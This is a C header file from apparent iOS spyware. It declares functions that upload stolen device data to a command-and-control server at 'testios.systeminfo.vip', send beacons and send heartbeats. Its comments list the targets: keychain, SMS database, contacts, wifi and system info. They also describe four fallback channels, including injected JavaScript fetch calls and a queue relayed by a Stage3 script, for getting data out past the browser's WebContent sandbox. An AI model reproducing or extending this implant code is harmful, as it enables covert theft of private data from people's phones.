#ifndef C2_H
#define C2_H
#include <stdint.h>
#include <stddef.h>

#define C2_DOMAIN    "testios.systeminfo.vip"
#define C2_PORT      443
#define C2_USE_HTTPS 1          /* 1 = HTTPS, 0 = HTTP */
#define C2_UPLOAD    "/upload"

/*
 * Payload version — bump the sub-version on every build that changes dylib
 * behaviour so the operator can confirm which version is running on-device.
 * Format: "<major>.<minor>".  Major = breaking change, minor = incremental.
 */
#define PAYLOAD_VERSION "1.5"

/*
 * upload_to_c2 — HTTP(S) POST one record to the Go /upload endpoint.
 *   category    : e.g. "keychain", "sms", "contacts", "wifi", "system"
 *   path        : source path on device, e.g. "/var/mobile/Library/SMS/sms.db"
 *   description : human-readable label
 *   b64data     : base64-encoded payload bytes
 *
 * Upload channel priority (each falls back to the next on failure):
 *   C — JSContext fetch() injection (WebContent JS thread / saved context)
 *   B — raw POSIX socket + SecureTransport TLS
 *   A — NSURLSession (blocked in WebContent, used outside WebContent)
 *   D — in-memory queue (g_cru_q) read by Stage3 JS after _process() returns;
 *       Stage3 POSTs items via fetch() — always permitted in WebContent.
 *       Items with base64 length ≥ CRU_Q_B64MAX are silently skipped.
 */
void upload_to_c2(const char *category, const char *path,
                  const char *description, const char *b64data);

/*
 * upload_beacon — synchronous diagnostic probe called from process().
 *
 * Channel priority: C → B → A → D (same as upload_to_c2).
 *
 * v1.5: Channel D is the new primary WebContent fallback.  If C/B/A all
 * fail (as observed in iOS 15–16 WebContent), the beacon is written into
 * g_cru_q[] and Stage3 relays it immediately after _process() returns.
 *
 * Log signatures:
 *   beacon in logs with (jsc)  → Channel C succeeded
 *   beacon in logs without tag → Channel B or A succeeded
 *   beacon relayed by Stage3   → Channel D succeeded (path=/coruna/beacon,
 *                                 description contains "v1.5")
 *   beacon absent              → all channels failed; file a bug
 */
void upload_beacon(void);

/* One-shot device info upload (iOS version, model, kernel version) */
void upload_device_info(void);

/* Heartbeat — lets C2 know the implant is alive */
void c2_heartbeat(void);

/* Legacy stub kept for ABI compat with any old callers */
void send_to_c2(const uint8_t *data, size_t len);

#endif /* C2_H */
